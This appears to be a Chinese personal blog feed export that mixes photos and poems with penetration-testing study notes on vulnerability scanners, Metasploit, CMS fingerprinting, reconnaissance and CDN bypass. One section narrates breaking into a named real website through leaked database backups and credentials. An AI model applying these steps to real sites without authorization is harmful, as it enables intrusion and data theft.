        <content type="html"><![CDATA[<hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/%E7%81%AB%E5%B1%B1.jpg" alt="火山" style="zoom:7%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/990F3B52A7945B34101DDCBABC0794E3.jpg" alt="990F3B52A7945B34101DDCBABC0794E3" style="zoom:43%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/%E5%86%B0%E5%B1%B1.jpg" alt="冰山" style="zoom:6%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/9799F67A2E383B01F996CD79873E77EA.jpg" alt="9799F67A2E383B01F996CD79873E77EA" style="zoom:33%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白夜行</title>
      <link href="/2023/05/14/%E7%99%BD%E5%A4%9C%E8%A1%8C/"/>
      <url>/2023/05/14/%E7%99%BD%E5%A4%9C%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230817031722396.png" alt="image-20230817031719245" style="zoom: 33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/IMG_20230310_220851-1024x934.jpg" alt="img" style="zoom: 40%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/QQ%E5%9B%BE%E7%89%8720240116170104.jpg" alt="QQ图片20240116170104" style="zoom:40%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/EC95DEEB017C955E761EF5FE0BC8606B.jpg" alt="EC95DEEB017C955E761EF5FE0BC8606B" style="zoom: 30%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> 摄影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摄影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aspyxia--短诗集</title>
      <link href="/2023/05/14/aspyxia-%E7%9F%AD%E8%AF%97%E9%9B%86/"/>
      <url>/2023/05/14/aspyxia-%E7%9F%AD%E8%AF%97%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我梦到你向我走来，<br>热烈的目光点燃了地狱的火<br>我只是一动不动的<br>注视你身后的黑潭。</p></blockquote><blockquote><p>巴库斯的酒宴一刻未停止，<br>西西弗的巨石却已无法前进。<br>当世界重回冷冰，<br>你突然想起最初的目的，<br>并不是要逃避不幸。</p></blockquote><blockquote><p>爱者和被爱者一同掉进漩涡，<br>所有疯狂的偶然伴随飓风<br>将每一个生活在地上的人吹起，<br>吹到一个混乱的地方，<br>一个让人相信彼岸为真的地方。<br>智者不入爱河，<br>智者视爱欲为艺术。</p><p>一个充满伤痛与激情的世界<br>一个爱欲的世界<br>才是真实的世界</p><p>202302214</p></blockquote><blockquote><p>他的双脚不曾踏上过平原<br>要么万丈深渊<br>要么悬崖峭壁</p><p>总之，他拒绝一切的白炽与平田<br>他要的是电闪雷鸣<br>他渴望看见的是绝境求生</p><p>虽说泛爱万物<br>却唯独拒绝了平庸与落俗</p></blockquote><blockquote><p>在白炽的黑夜里，心脏搏动和胃液翻滚的声音交织在一起，我的身体已然是一座行走的墓碑</p></blockquote><blockquote><p>那个时候烤肠一块五,珍珠奶茶两块钱一杯。一个阴天，我坐在外面的小板凳上，穿的裙子。奶茶店上面白色的棚子，各种味道的奶茶粉盒子，舀冰粉的勺子很劣质，会很轻易把嘴唇划砍，地上是很小很工整的蓝白相间的地砖，周围很空旷，很冷……拼了命想要抓住的回忆，还是不停溜走。恨自己的脑袋不能装下全部<br><code>20230416</code></p></blockquote><blockquote><p>干脆直接喝酒喝死算求了<br>大把大把的钞票<br>红色绿色<br>抓起来又飞走<br>虽然一无所有但是还爱着午夜的吉他和楼下的小猫咪<br>然后一边说着要读点名著一边写起了明天的学习计划<br>日记，日记早就被忘了几百年<br>身体，<br>趁自己烂醉如泥<br>把糟糕透的自己交付给随便哪个人<br>身体丢到哪里都无所谓<br>他说高材生洁身自好<br>又好又好<br><code>20230428</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 诗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 诗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当痛苦大于痛苦本身的时候</title>
      <link href="/2023/05/14/%E5%BD%93%E7%97%9B%E8%8B%A6%E5%A4%A7%E4%BA%8E%E7%97%9B%E8%8B%A6%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%97%B6%E5%80%99/"/>
      <url>/2023/05/14/%E5%BD%93%E7%97%9B%E8%8B%A6%E5%A4%A7%E4%BA%8E%E7%97%9B%E8%8B%A6%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%97%B6%E5%80%99/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写于高三的某个深夜</p></blockquote><blockquote><p>①——我被困在山中，寻找着出山的路。<br>越是向上攀爬，越是清晰的看见朝霞。<br>也许，那便是家的方向。<br>——什么时候开始，那来自远天的太阳之光，<br>竟也成了你唯一的希望！</p><p>②我离那道门越来越远了，<br>不是门里的景色不再迷人，<br>只是，他们都推着我，<br>一同向山顶进击。<br>我呢，我的沉默还不能说明什么吗？<br>门还没有关闭，<br>我的眼里却先蒙上了沙。</p><p>③有时候，我也会忘记。<br>忘记冬天的鱼也会呼吸，<br>忘记水中的皓月是个奇迹，<br>忘记俯下身，听一听蚂蚁的咆哮。<br>面对熊熊的生命之火，<br>我只是义无反顾地跳进去，<br>却还渴望生出美丽的火花。</p><p>④像是预谋许久的，<br>我嚷道：“风将我的心吹冷了，<br>       我如何能使它温暖！”</p><p>(不)⑤我以为，我听见了大楼倒塌的声音。<br>   我以为我即将无家可归。<br>   可我分明还静坐在这里，<br>   像其他所有人一样，<br>   百无聊赖地等着日出。<br>   可究竟是哪里的大楼倒了，<br>   我竟这样地无动于衷！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 诗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞发现</title>
      <link href="/2023/05/14/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
      <url>/2023/05/14/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="探针-工具"><a href="#探针-工具" class="headerlink" title="探针(工具)"></a>探针(工具)</h3><h6 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h6><p>漏洞扫描工具，官网下载，扫描ip、域名的漏洞。</p><p>可视化图形界面，缺点就是漏洞库不太长，扫出来的漏洞有遗漏。</p><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><p>分为两种，一种是利用默认的nse插件扫描(就是加参数的那种)<code>Nmap --script=vuln，还有就是调用第三方库探针</code>Nmap vulscan&#x2F;vulners`。参考：<a href="https://www.cnblogs.com/shwang/p/12623669.html">https://www.cnblogs.com/shwang/p/12623669.html</a> 下载之后放到script目录下面，和内置插件放一起。</p><h6 id="Nessus-推荐"><a href="#Nessus-推荐" class="headerlink" title="Nessus(推荐)"></a>Nessus(推荐)</h6><p>可视化网站界面，需要先开启网站服务，配置好了时候开始扫描。这个漏洞扫描工具相对来说是扫描最全面的，扫出来的漏洞也最多。</p><p>这是属于稍微大型一点的漏扫，不建议私下使用，太容易被发现。</p><p>安装的时候看看文档，一定要管理员运行系统。</p><h6 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h6><h6 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h6><h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><h6 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h6><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><h6 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h6><p>…</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h5 id="工具框架"><a href="#工具框架" class="headerlink" title="工具框架"></a>工具框架</h5><h6 id="Matasploit"><a href="#Matasploit" class="headerlink" title="Matasploit"></a>Matasploit</h6><p>命令行敲入<code>msfconsole</code></p><p>进入msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> search ...(搜索漏洞编号)</span><br><span class="line"> use ...(加详细漏洞名称)</span><br><span class="line"> show options  ...(显示需要的条件host，port等等)</span><br><span class="line"> run/exploit</span><br></pre></td></tr></table></figure><h6 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 直接searchsploit  加关键字，搜索</span><br></pre></td></tr></table></figure><h6 id="企业单位内部产品"><a href="#企业单位内部产品" class="headerlink" title="企业单位内部产品"></a>企业单位内部产品</h6><p>…</p><h5 id="单点EXP"><a href="#单点EXP" class="headerlink" title="单点EXP"></a>单点EXP</h5><h6 id="cnvd"><a href="#cnvd" class="headerlink" title="cnvd"></a>cnvd</h6><p>国家信息安全漏洞共享平台</p><h6 id="seebug"><a href="#seebug" class="headerlink" title="seebug"></a>seebug</h6><h6 id="1337day"><a href="#1337day" class="headerlink" title="1337day"></a>1337day</h6><h6 id="exploit-db-com"><a href="#exploit-db-com" class="headerlink" title="exploit-db.com"></a>exploit-db.com</h6><h6 id="Packetstorm-Security"><a href="#Packetstorm-Security" class="headerlink" title="Packetstorm Security"></a>Packetstorm Security</h6><h2 id="web应用"><a href="#web应用" class="headerlink" title="web应用"></a>web应用</h2><h3 id="已知cms"><a href="#已知cms" class="headerlink" title="已知cms"></a>已知cms</h3><p>比如常见的dedecms，discus，Wordpress等源码结构，这种一般采用非框架类开发，但也有山部分采用的是框架类开发，针对此类型源码程序的安全监测，我们要利用公开的漏洞进行测试，如不存在用白盒代码审计自行挖掘。</p><p>怎么挖掘cms？</p><blockquote><p>看看<strong>robots.txt</strong></p><p>看看返回数据包</p><p>cms扫描工具</p><p>敏感文件目录去搜，这个站看不到东西也可以记住文件目录格式去fofa上搜同样的站去看</p></blockquote><p><strong>有一个目录:<code>/data/admin/ver.txt</code>可以查看网站更新时间</strong></p><ul><li>单点exp平台去搜&#x2F;谷歌&#x2F;必应&#x2F;百度去搜</li><li>cms漏洞扫描工具框架：cmsscan，wpscan，joomscan，drupalscan【很多框架，cms都有专门的漏扫工具】</li><li>代码审计…</li></ul><h3 id="开发框架"><a href="#开发框架" class="headerlink" title="开发框架"></a>开发框架</h3><p>如常见的thinkPHP，spring，flask等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息（名字，版本），通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。</p><ul><li>php<ul><li>Yii</li><li>Laravel</li><li>thinkphp</li></ul></li><li>java<ul><li>Shiro</li><li>struts</li><li>spring</li><li>Maven</li></ul></li><li>python<ul><li>flask</li><li>Django</li><li>Tornado</li></ul></li></ul><h3 id="未知cms"><a href="#未知cms" class="headerlink" title="未知cms"></a>未知cms</h3><p>如常见的企业或个人的 内部程序源码，也可以是某cms二次开发的源码结构，针对此类的程序源码测试思路：能识别二次开发就按已知cms思路进行，不能群定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针(功能点，参数，盲猜)，同样可以白盒代码审计。</p><h3 id="实战：某外挂站的渗透"><a href="#实战：某外挂站的渗透" class="headerlink" title="实战：某外挂站的渗透"></a>实战：某外挂站的渗透</h3><h6 id="首先信息搜集cms"><a href="#首先信息搜集cms" class="headerlink" title="首先信息搜集cms"></a>首先信息搜集cms</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> www.668jq.com/robotx.txt              #查看到网站的cms</span><br><span class="line"> www.668jq.com/data/admin/ver.txt      #查看到网站最后更新时间，发现是18年，一般就找18年之后的该cms的漏洞，之前的漏洞一般都被修复。找了下发现没什么可以利用的漏洞。</span><br></pre></td></tr></table></figure><h6 id="尝试弱口令"><a href="#尝试弱口令" class="headerlink" title="尝试弱口令"></a>尝试弱口令</h6><p>输入默认后台路径，没找到。</p><p>尝试爆破后台路径。</p><p>网上搜索下尝试找找然后找到了。。</p><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6><p>nmap -sV [<a href="www.668jq.com">www.668jq.com</a></p><p>然后发现了888端口和8888端口—&gt;我们想到—-&gt;可能有<strong>宝塔</strong></p><p>弄了一下发现还是没有</p><h6 id="找找源码备份文件"><a href="#找找源码备份文件" class="headerlink" title="找找源码备份文件"></a>找找源码备份文件</h6><p>然后找到数据库备份文件，找到账密。结果连接不上，原因是宝塔一些配置信息，不支持外连</p><p>然后继续找，找到源码备份文件里面有之前的备份文件，里面有之前的一个数据库备份文件，用哪个账密连接一下，成功。进入数据库之后找到后台账密，成功！</p><h2 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h2><h6 id="思路说明"><a href="#思路说明" class="headerlink" title="思路说明"></a>思路说明</h6><p>反编译提取URL或者抓包获取url，进行web应用测试。如果不存在或走其他协议的情况下，需要采用网络接口抓包进行数据获取，转至其他协议安全测试</p><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>先用一个APP模拟器模拟手机。【小迪用的逍遥模拟器】</p><h6 id="http-https协议"><a href="#http-https协议" class="headerlink" title="http&#x2F;https协议"></a>http&#x2F;https协议</h6><ul><li>burpsuit【需要提前配置，要https也要抓】</li><li>Charies</li><li>Fiddler</li><li>抓包精灵</li></ul><p>抓到网站域名ip端口之后去电脑端访问，如果访问不起就说明他的user-agent有限制，只能手机APP访问，所以我们需要改一下网站访问的请求包，具体参考手机访问的时候的请求包来改。甚至可以直接复制过去改了。注意如果还需要用漏扫工具，就需要先在漏扫工具里面设置一下，修改http头，再来扫。</p><h6 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h6><p>wireshark</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><ul><li>一键提取APK涉及url利用【漏了个大洞】，输入apk文件，就能直接把apk涉及的url输出APK文件，就是软件安装之前下载的那个安装包—&gt;后缀会带.apk</li><li>反编译重写代码端编译测试</li></ul><h2 id="API接口服务-dd"><a href="#API接口服务-dd" class="headerlink" title="API接口服务(dd)"></a>API接口服务(dd)</h2><p>根据前期信息搜集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法是：口令安全，web类漏洞，版本漏洞等，其中产生的危害可大可小，属于端口服务&#x2F;第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。</p><p><a href="#">api接口测试</a></p><h6 id="API接口-webservice-restful-api"><a href="#API接口-webservice-restful-api" class="headerlink" title="API接口-webservice restful api"></a>API接口-webservice restful api</h6><p>根据自身的功能方向决定，安全测试目标需要有api接口调用才能进行此类渗透，主要涉及的安全问题有：自身安全，配合web，业务逻辑等。</p><h2 id="其他测试"><a href="#其他测试" class="headerlink" title="其他测试"></a>其他测试</h2><h5 id="端口测试"><a href="#端口测试" class="headerlink" title="端口测试"></a>端口测试</h5><h6 id="web服务类"><a href="#web服务类" class="headerlink" title="web服务类"></a>web服务类</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031241100-639x1024.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031340476.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031241100-1-639x1024.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031340476-1.png"></p><h6 id="数据库类"><a href="#数据库类" class="headerlink" title="数据库类"></a>数据库类</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031509504.png"></p><h6 id="大数据类"><a href="#大数据类" class="headerlink" title="大数据类"></a>大数据类</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031532647.png"></p><h6 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031558288.png"></p><h6 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031638619.png"></p><h6 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031706954.png"></p><h6 id="其他服务"><a href="#其他服务" class="headerlink" title="其他服务"></a>其他服务</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230502031731798.png"></p><h5 id="域名发现"><a href="#域名发现" class="headerlink" title="域名发现"></a>域名发现</h5><h6 id="注册人"><a href="#注册人" class="headerlink" title="注册人"></a>注册人</h6><p>同一个注册人注册的不同的几个域名很有可能是用于同一个东西，同一个业务，说不定ip在同一网段。</p><h6 id="域名登记"><a href="#域名登记" class="headerlink" title="域名登记"></a>域名登记</h6><p>注册人可能在统一个域名注册了好几个后缀。.com,.cn,.com.cn等等</p><h6 id="特有信息"><a href="#特有信息" class="headerlink" title="特有信息"></a>特有信息</h6><p>如一些网站名字，公司名字，域名关键字等等都可以搜索。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透前期准备</title>
      <link href="/2023/05/14/%E6%B8%97%E9%80%8F%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/"/>
      <url>/2023/05/14/%E6%B8%97%E9%80%8F%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h3 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h3><h6 id="域名与ip"><a href="#域名与ip" class="headerlink" title="域名与ip"></a>域名与ip</h6><p>通过域名和ip地址访问的时候，有些网站设置的根目录不一样。</p><p>一般ip访问的时候根目录会更低一级，所以应该能扫描出更多的东西。比如有些网站会有备份文件会放在域名根目录同一级，正好就是ip访问的那一级，正好能扫描出来。</p><p>总之，我们目录扫描的时候尽量扫ip。</p><h6 id="访问者权限"><a href="#访问者权限" class="headerlink" title="访问者权限"></a>访问者权限</h6><p>在我们访问一个网站的时候，发现有些网页我们没有权限访问，那我们访问者的权限是什么呢？在iis中，有一个<strong>来宾账户</strong>的用户组，这就是我们普通人去访问网站的权限。</p><h3 id="web源码拓展"><a href="#web源码拓展" class="headerlink" title="web源码拓展"></a>web源码拓展</h3><h6 id="框架-cms搜集"><a href="#框架-cms搜集" class="headerlink" title="框架,cms搜集"></a>框架,cms搜集</h6><p>关注应用分类及脚本估摸出可能存在的漏洞(其中框架类除外)，在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理(数据库备份，bak文件等)，未获取到的源码采用各种方法想办法获取！</p><ul><li>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</li><li>开源，为开源问题，框架非框架问题，关于cms识别问题及后续等</li><li>关于源码获取的相关途径：搜索，淘宝咸鱼，第三方源码站，各种行业对应</li><li>cms查找：特殊文件数据包，网站一些信息透露，第三方库字典跑</li></ul><h3 id="系统及数据库等"><a href="#系统及数据库等" class="headerlink" title="系统及数据库等"></a>系统及数据库等</h3><h6 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h6><ul><li>有网站：在url上面小写改大写，如果回显正常就说明Windows，否则linux。这俩个一个不区分大写一个区分大写。</li><li>只有一个ip地址：nmap扫描</li><li>通过TTL值来判断主机的操作系统(不推荐)【ping的时候就会返回TTL值】</li></ul><h6 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h6><ul><li>有网站的：一般不同的脚本语言对应有不同的常见搭配数据库ASP + AccessPHP + mysqlaspx + mssqljsp + mssql&#x2F;oraclepython + mangoDB&#x2F;mysql 并且有些数据库也之和某种操作系统有兼容，比如mysql不能再linux上</li><li>查看端口开放：<strong>关系型数据库</strong>MYSQL 3306SQLserver 1433Oracle 1521<strong>Nosql数据库</strong>MongoDB 27017Redis 6379memcache 11211</li></ul><h6 id="加密编码算法"><a href="#加密编码算法" class="headerlink" title="加密编码算法"></a>加密编码算法</h6><p>前言：在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备。</p><ul><li>常见加密编码等算法解析MD5，SHA，ASC(ascii)，进制，时间戳，URL，BASE家族，Unescape，AES，DES</li><li>常见加密形式算法解析直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合</li><li>常见解密方式(针对)枚举，自定义逆行算法，可逆向</li><li>了解常规加密算法的特性长度位数，字符规律，代码分析，搜索获取</li></ul><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h6 id="无CDN搜集思路"><a href="#无CDN搜集思路" class="headerlink" title="无CDN搜集思路"></a>无CDN搜集思路</h6><ul><li>程序源码<ul><li>内部&#x2F;未知CMS</li><li>开源CMS</li></ul></li><li>其他<ul><li>操作系统</li><li>搭建平台</li><li>数据库类型</li></ul></li><li>站点搭建<ul><li>目录站点</li><li>端口站点</li><li>子域名站点</li><li>旁注&#x2F;C段站点</li><li>类似域名站点</li></ul></li><li>防护应用WAF<ul><li>安全狗</li><li>宝塔</li><li>云盾</li><li>安骑士</li></ul></li></ul><h6 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h6><ul><li>目录型站点一个网站，他的子目录有一个点开时候发现是全新的一个系统或者cms啥的。可能这是在两个目录下的两个程序或者网站。两边任意一边有漏洞就两边都打了。</li><li>端口类站点有的网站默认80，加80端口就是跳转的主页，如果加8080说不定就跳后台或者其他什么地方去了</li><li>子域名站点有一些网站有子域名，然后他的子域名和主域名不是同一个ip地址但是是同网段，就涉及到内网渗透了。Google搜索site：xxx.com就能找到子域名。子域名主域名两套cms也是有可能的。</li><li>类似域名站点xxx.com,xxx.cn两个网站，后缀不一样，但有可能是同一个公司的不同网站，说不定是同一个ip或者ip网段。</li><li>旁注&#x2F;C段站点旁注：同服务器不同站点。攻击思路：通过攻击旁注站点来攻击目标站点。C段：不同服务器(同网段)不同站点。攻击思路：攻击C段服务器，然后内网渗透测试可以用工具查旁注C段。</li><li>搭建软件特征站点主要看网站搭建者的搭建习惯。在server那个地方，写的路径版本号很全的一般都是用的搭建平台。而且，同一种搭建平台一般server是一样的，不同的搭建平台之间又是不一样的。常见的就是PHPstudy或者宝塔。。比如我们知道了是PHPstudy搭建的，一般根目录下就会有一个PHPmyadmin，有默认账密。。思路：根据PHPstudy特有的server，我们去shodan或者fofa上面搜，搜到了之后一个一个试试有没有PHPmyadmin，试出来了就默认账密或者弱口令爆破一下。</li></ul><h6 id="waf初步"><a href="#waf初步" class="headerlink" title="waf初步"></a>waf初步</h6><ul><li>waf识别<ul><li>wafw00f是一个waf识别工具，在github上有源码的，比较推荐。</li><li>wafw00f-shodan(X-Powered-By:WAF),部分有waf的网站返回的数据包里会有这样的特征</li></ul></li><li>waf的意义</li></ul><blockquote><p>如果对方有waf就不要直接开扫，可能会拉黑ip地址</p></blockquote><h6 id="信息搜集思路"><a href="#信息搜集思路" class="headerlink" title="信息搜集思路"></a>信息搜集思路</h6><p>目前主要涉及到的就是web站点信息搜集，当然也存在那种只有ip，放在浏览器中打不开站点貌似没有web服务的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230422034858396.png"></p><p>主要的思路就是上面这张图。</p><p>首先三大黑暗搜索引擎：shodan，zoomeye，fofa是主要的信息搜集工具</p><ul><li>把ip放进黑暗引擎去搜端口和服务或者域名啥的。</li><li>也可以用nmap去搜</li><li>拿到一些端口之后找一些比较不同的回显，或者比较敏感的服务，比如如果看到frp就直接试试用自己的服务器去尝试frp对方的服务器连接。然后记录敏感服务，端口，版本</li><li>这个时候如果进到一些后台了就去弱口令扫</li><li>然后端口差不多就利用完了，现在开始看域名</li><li>去搜索一些子域名站点，直接Google搜索，site:域名。搜索到一些子域名，或者直接搜索，搜域名，关键字之类的找找子域名</li><li>也可以通过ip反差域名，网上搜索第三方工具</li><li>然后旁站查询，C段查询等等，还有备案号，查询该公司历史备案号，也有可能是旁站之类的。查到类似的站 了就按照第一步流程继续搞，拓宽信息搜集数据。</li><li>关于备案信息，可以使用站长工具这个第三方工具查询。点开某网站的域名备案信息，同一个备案号下可能备案了好几个站，都是同一个人搭建的，可能有形似点。</li></ul><h6 id="python爬虫下载exp和ctcms"><a href="#python爬虫下载exp和ctcms" class="headerlink" title="python爬虫下载exp和ctcms"></a>python爬虫下载exp和ctcms</h6><p>用网上一段python代码把github上一些最新的exp和ctcms这个cms下载下来</p><h6 id="其他信息搜集"><a href="#其他信息搜集" class="headerlink" title="其他信息搜集"></a>其他信息搜集</h6><ul><li>黑暗引擎实现域名端口等收集</li><li>全自动域名手机枚举优秀脚本使用</li><li>src目标中的信息搜集全覆盖</li><li>利用其他第三方借口获取更多信息</li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN</title>
      <link href="/2023/05/14/cdn/"/>
      <url>/2023/05/14/cdn/</url>
      
        <content type="html"><![CDATA[<p>CDN全称<strong>Content Delivery Network</strong>，<strong>内容分发网络</strong>。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的_瓶颈和环节_，使内容传输得更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，<em>提高用户访问网站的响应速度。</em></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>有CDN的服务器，会对我们的安全测试有影响(后面会详细介绍)，所以我们需要判断目标是否存在CDN，并且掌握常见的绕过手段。</p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p><strong>超级ping</strong></p><p>多个地点ping，ping目标网站的ip，如果多个地方ping出来的ip都是一样的，说明这个目标大概率是没有开CDN的，反之如果我们ping京东淘宝等官网，就会发现对个地点ping出来的ip不一样，这就说明这些网站开了CDN。</p><p>开了CDN，不同的地方ping出来的ip不一样，也就谁说不同的地点去访问同一个域名，返回的内容会有一些因为缓存的时效性或其他原因而存在的细微差别</p><h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p>cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>考虑到一些流量和成本问题，很多网站的主站使用了CDN服务但是分站(子域名)可能就没有使用CDN服务。而子域名又有一定可能性是和主域名在同一个ip或者同一个网段下的。</p><blockquote><p>如果同ip那就直接找到目标真实ip</p></blockquote><blockquote><p>如果同网段下，也就是前三位一样最后一位是1-254中的一个数字，通过扫描ip或者扫描每一个ip对应的80端口或者HE其他端口开放情况来爆破出真实ip</p></blockquote><h4 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h4><p>邮箱服务器一般就是内部人员使用访问，流量较小，而且邮箱服务器是用来发送邮件的，也就是它主动访问用户而不是用户访问它，没必要设置一个CDN节点。</p><p>因此绝大部分公司都不会给邮箱服务器设置CDN服务。</p><p>那么我们可以根据目标邮箱服务器给我们发送的邮件，来进一步找到这个服务器的ip，拿到的这个服务器，也属于一种子域名。</p><h4 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h4><p>一般小型公司，不会照顾国外的客户流量，也就是说不会设置国外的节点，所以国王ping的地址有可能是真实ip</p><h4 id="扫描全网"><a href="#扫描全网" class="headerlink" title="扫描全网"></a>扫描全网</h4><p>和超级ping一样，全网各个地方都访问，分析返回的所有ip，找出其中最有可能的ip</p><blockquote><ul><li>不可能所有地方都开了节点</li><li>真实ip附近的地方，因为已经足够近了所以不需要开CDN节点，这个时候访问的就是真实ip</li></ul></blockquote><p><em>funkcdn ， zmap ， 